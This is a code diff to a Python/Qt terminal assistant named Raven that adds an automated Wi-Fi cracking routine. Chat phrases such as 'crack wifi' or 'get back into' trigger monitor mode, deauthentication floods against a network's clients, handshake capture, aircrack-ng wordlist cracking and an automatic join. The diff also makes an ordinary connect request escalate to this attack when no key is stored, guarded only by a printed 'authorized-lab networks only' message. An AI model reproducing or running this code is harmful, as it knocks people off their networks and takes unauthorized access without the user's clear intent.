@@ -4450,6 +4450,13 @@ NEST_RE = re.compile(
     r"|\bconnect\s+(?:me\s+)?to\s+(?:the\s+)?wifi\s+(?:named\s+|called\s+)?([\w.\- ]+?)[\s.!?;:]*$",
     re.IGNORECASE,
 )
+CRACK_RE = re.compile(
+    r"\b(?:crack|brute[- ]?force|penetrate|break into)\b[\s\S]*?\bwifi\s+(?:named\s+|called\s+)?([\w.\- ]+?)[\s.!?;:]*$"
+    r"|\b(?:crack|brute[- ]?force|penetrate)\s+(?:the\s+)?wifi\s+(?:named\s+|called\s+)?([\w.\- ]+?)[\s.!?;:]*$"
+    r"|\bget\s+back\s+into\s+([\w.\- ]+?)[\s.!?;:]*$"
+    r"|\bhack\s+into\s+the\s+wifi\s+(?:named\s+|called\s+)?([\w.\- ]+?)[\s.!?;:]*$",
+    re.IGNORECASE,
+)
 
 
 class AskRavenTerm(QWidget):
@@ -4470,6 +4477,8 @@ class AskRavenTerm(QWidget):
         self._nest_step = None
         self._nest_ssid = None
         self._nest_dev = None
+        self._pen = None          # active attack state (dict) or None
+        self._cap_proc = None     # background airodump handle
 
         lay = QVBoxLayout(self)
         lay.setContentsMargins(0, 0, 0, 0)
@@ -4525,6 +4534,14 @@ class AskRavenTerm(QWidget):
             return
         self.speak(f"$ {text}", NEON)
         low = text.lower()
+        mc = CRACK_RE.search(low)
+        if mc:
+            ssid = next((g for g in mc.groups() if g), None)
+            if not ssid:
+                self.speak("raven: attack needs a network name — try 'crack wifi TELSU0773'.", MUTED)
+                return
+            self._attack(ssid.strip(" \t.!?;:"))
+            return
         m = NEST_RE.search(low)
         if m:
             ssid = next((g for g in m.groups() if g), None)
@@ -4554,11 +4571,17 @@ class AskRavenTerm(QWidget):
         if data:
             for line in data.splitlines():
                 self.speak(line)
+            if self._pen:
+                self._pen.setdefault("log", "")
+                self._pen["log"] += data
             self.log("[birdshit] " + data.strip())
 
     def _done(self, code, _status):
         if self._nest_step:
             self._nest_done(code)
+            return
+        if self._pen:
+            self._pen_done(code)
             return
         self.speak(f"[exit {code}]", SEV_CRIT if code else SEV_INFO)
         self.proc = None
@@ -4674,11 +4697,12 @@ class AskRavenTerm(QWidget):
                 self._start_nm(["dev", "wifi", "connect", ssid, "password", psk])
                 return
             self.speak(
-                "raven couldn't nest and has no stored key for that network. "
-                "run it once yourself — 'nmcli --ask device wifi connect <ssid>' — "
-                "and the key will be remembered for next time.",
-                SEV_CRIT,
+                "no stored key — raven stepping up to LOUD (deauth, handshake capture, offline crack)…",
+                SEV_HIGH,
             )
+            self._nest_reset()
+            self._attack(ssid)
+            return
         else:
             self.speak(f"nest failed even with the stored key — is {ssid} in range?", SEV_CRIT)
         self._nest_reset()
@@ -4688,6 +4712,218 @@ class AskRavenTerm(QWidget):
         self._nest_ssid = None
         self._nest_dev = None
         self.proc = None
+
+    # --- attack: capture + crack the handshake to get back on an authorized wifi -
+    def _attack(self, ssid):
+        if not ssid:
+            self.speak("raven: attack needs a network name — try 'crack wifi TELSU0773'.", MUTED)
+            return
+        for exe in ("aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"):
+            if not shutil.which(exe):
+                self.speak(f"raven: {exe} missing — apt install aircrack-ng first.", SEV_CRIT)
+                return
+        if not shutil.which("nmcli"):
+            self.speak("raven: nmcli missing — can't reconnect after a crack.", SEV_CRIT)
+            return
+        lst = self._wordlists()
+        if not lst:
+            self.speak("raven: no usable wordlists under /usr/share/wordlists.", SEV_CRIT)
+            return
+        now = self._wifi_now()
+        if now and now.lower() == ssid.lower():
+            self.speak(f"raven: already nested at {now} — no need to crack anything.", SEV_INFO)
+            return
+        self._pen = {"ssid": ssid, "lists": lst, "list_i": 0, "round": 0,
+                     "bssid": None, "ch": None, "dev": None, "mon": None,
+                     "capdir": str(Path("/tmp/ravenheart") / "pen"),
+                     "cap": None, "key": None, "log": "", "stage": "attack"}
+        self.speak("raven going LOUD — deauth, handshake capture, offline crack. "
+                   "authorized-lab networks only.", SEV_HIGH)
+        self._pen_resolve()
+
+    def _wordlists(self):
+        cands = ["/usr/share/wordlists/wifite.txt",
+                 "/usr/share/wordlists/fasttrack.txt",
+                 "/usr/share/wordlists/john.lst"]
+        return [p for p in cands if Path(p).exists()]
+
+    def _pen_resolve(self):
+        pen = self._pen
+        rc, out = self._run_sync(["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL", "dev", "wifi"], 12)
+        target = pen["ssid"].lower()
+        hit = None
+        if rc == 0:
+            for line in out.splitlines():
+                f = line.rstrip(":").split(":")
+                if len(f) >= 3 and f[0].lower() == target:
+                    hit = {"bssid": f[1].replace("\\:", ":"), "ch": f[2]}
+                    break
+        if not hit:
+            self.speak(f"raven: '{pen['ssid']}' is not visible — is it broadcasting and in range? "
+                       "a hidden SSID has to already be saved for nest to use it.", SEV_CRIT)
+            self._pen_cleanup(dropped=False)
+            return
+        pen["bssid"], pen["ch"] = hit["bssid"], hit["ch"]
+        pen["dev"] = self._wifi_device()
+        if not pen["dev"]:
+            self.speak("raven: no wifi radio to put into monitor mode.", SEV_CRIT)
+            self._pen_cleanup(dropped=False)
+            return
+        self.speak(f"raven caught {pen['ssid']} on ch {pen['ch']} ({pen['bssid']}) — arming monitor…", NEON)
+        self.speak(f"(this drops the connection on {pen['dev']} — that's normally the point.)", MUTED)
+        rc, out = self._run_sync(["sudo", "airmon-ng", "check", "kill"], 30)
+        rc, out = self._run_sync(["sudo", "airmon-ng", "start", pen["dev"]], 40)
+        if rc != 0 and "monitor mode enabled" not in out:
+            self.speak("raven: airmon-ng could not raise a monitor interface.", SEV_CRIT)
+            self._pen_cleanup(dropped=True)
+            return
+        m = re.search(r"monitor mode enabled on\s+([A-Za-z0-9]+)", out)
+        mon = m.group(1) if m else pen["dev"] + "mon"
+        pen["mon"] = mon
+        self.speak(f"monitor up: {mon} — capturing toward {pen['ssid']}…", NEON)
+        QTimer.singleShot(250, self._pen_start_capture)
+
+    def _pen_start_capture(self):
+        pen = self._pen
+        d = Path(pen["capdir"])
+        shutil.rmtree(d, ignore_errors=True)
+        d.mkdir(parents=True, exist_ok=True)
+        pen["cap"] = str(d / "nest")
+        cap = QProcess(self)              # background 'till we stop it — never wired to _done
+        cap.start("sudo",
+                  ["airodump-ng", "--bssid", pen["bssid"], "-c", pen["ch"],
+                   "-w", pen["cap"], pen["mon"]])
+        self._cap_proc = cap
+        QTimer.singleShot(700, lambda: self._pen_deauth())
+
+    def _pen_deauth(self):
+        pen = self._pen
+        pen["round"] += 1
+        self.speak(f"raven @ deauth round {pen['round']}/3 — kicking clients to force a handshake…", NEON)
+        rc, out = self._run_sync(["sudo", "aireplay-ng", "-0", "8", "-a", pen["bssid"],
+                                  "--ignore-negative-one", pen["mon"]], 25)
+        if "no such BSSID" in out or "no client" in out.lower():
+            self.speak("raven: no clients associated to deauth — waiting for one to connect.", MUTED)
+        QTimer.singleShot(7000, self._pen_check)
+
+    def _pen_check(self):
+        pen = self._pen
+        caps = sorted(Path(pen["capdir"]).glob("nest-*.cap"))
+        if not caps:
+            self.speak("raven: airodump wrote no capture (radio quiet?).", SEV_CRIT)
+            self._pen_cleanup(dropped=True)
+            return
+        target = str(caps[0])
+        rc, out = self._run_sync(["aircrack-ng", target], 20)
+        has = ("handshake" in out and pen["bssid"].lower() in out.lower())
+        if has:
+            self.speak("handshake captured — firing the cracker…", SEV_HIGH)
+            QTimer.singleShot(200, lambda: self._pen_crack(target))
+            return
+        if pen["round"] < 3:
+            self.speak(f"no handshake yet — {pen['round']}/3… one more deauth round.", MUTED)
+            QTimer.singleShot(300, self._pen_deauth)
+            return
+        self.speak("raven: no handshake after 3 rounds — either nobody is on that wifi, "
+                   "or the radio can't hear the AP.", SEV_CRIT)
+        self._pen_cleanup(dropped=True)
+
+    def _pen_crack(self, cap):
+        pen = self._pen
+        if pen["list_i"] >= len(pen["lists"]):
+            self.speak("raven: tried every built-in list — the passphrase is not in them. "
+                       "bring your own wordlist with 'shell: aircrack-ng -w /path/list <cap>'.",
+                       SEV_CRIT)
+            self._pen_cleanup(dropped=True)
+            return
+        pen["curcap"] = cap
+        wl = pen["lists"][pen["list_i"]]
+        pen["log"] = ""
+        pen["stage"] = "crack"
+        self.speak(f"cracking {cap} with {Path(wl).name} — this can take a while…", NEON)
+        self.proc = QProcess(self)
+        self.proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
+        self.proc.readyReadStandardOutput.connect(self._drain)
+        self.proc.finished.connect(self._done)
+        self.proc.start("aircrack-ng", ["-b", pen["bssid"], "-w", wl, cap])
+
+    def _pen_done(self, code):
+        pen = self._pen
+        if pen["stage"] == "crack":
+            text = pen.get("log", "")
+            m = re.search(r"KEY FOUND!\s*\[\s*([^\]]+?)\s*\]", text)
+            if m:
+                pen["key"] = m.group(1).strip()
+                self.speak("KEY FOUND — passphrase recovered.", SEV_HIGH)
+                self.speak("raven restoring the radio, then the nest…", NEON)
+                self._pen_cleanup(dropped=False)
+                QTimer.singleShot(1200, self._pen_connect)
+                return
+            pen["list_i"] += 1
+            self.speak(f"not in {Path(pen['lists'][pen['list_i'] - 1]).name} — next list…", MUTED)
+            self.proc = None
+            QTimer.singleShot(100, lambda: self._pen_crack(self._pen["curcap"]))
+            return
+        if pen["stage"] == "connect":
+            if code == 0:
+                ip = self._ip_of(pen["dev"]) or "?"
+                self.speak(f"raven nested at {pen['ssid']} on {pen['dev']} — ip {ip}", SEV_INFO)
+                self.speak("confirm this is a network you own/authorize, then keep within scope.", MUTED)
+                self.speak(f"verified passphrase: {pen['key']}", SEV_CRIT)
+                self.report(f"raven cracked & nested at {pen['ssid']} — ip {ip}")
+                self.log(f"[birdshit] crack+nest {pen['ssid']} ip {ip}")
+            else:
+                self.speak(f"key recovered but the nest failed — is {pen['ssid']} in range?", SEV_CRIT)
+        self._pen_cleanup(dropped=False)
+
+    def _pen_cleanup(self, dropped):
+        pen = self._pen
+        if pen is None:
+            return
+        if self._cap_proc is not None:
+            try:
+                self._cap_proc.terminate()
+            except Exception:
+                pass
+            self._cap_proc = None
+        mon = pen.get("mon")
+        if dropped and mon:
+            self._run_sync(["sudo", "airmon-ng", "stop", mon], 25)
+            self._run_sync(["sudo", "systemctl", "restart", "NetworkManager"], 25)
+            self.speak("radio restored under NetworkManager.", MUTED)
+        elif mon:
+            self._run_sync(["sudo", "airmon-ng", "stop", mon], 25)
+            self._run_sync(["sudo", "systemctl", "restart", "NetworkManager"], 25)
+            self.speak("radio restored under NetworkManager.", MUTED)
+        self._pen_reset()
+
+    def _pen_connect(self):
+        pen = self._pen
+        pen["stage"] = "connect"
+        self.speak("joining with the recovered key…", NEON)
+        self.proc = QProcess(self)
+        self.proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
+        self.proc.readyReadStandardOutput.connect(self._drain)
+        self.proc.finished.connect(self._done)
+        self.proc.start("nmcli", ["dev", "wifi", "connect", pen["ssid"], "password", pen["key"]])
+
+    def _pen_reset(self):
+        pen = self._pen
+        if pen and self._cap_proc is not None:
+            try:
+                self._cap_proc.terminate()
+            except Exception:
+                pass
+            self._cap_proc = None
+        self._pen = None
+        self.proc = None
+
+    def _run_sync(self, args, timeout=20):
+        try:
+            r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
+            return r.returncode, (r.stdout or "") + (r.stderr or "")
+        except Exception as ex:
+            return -1, repr(ex)
 
 
 class Raven(QMainWindow):
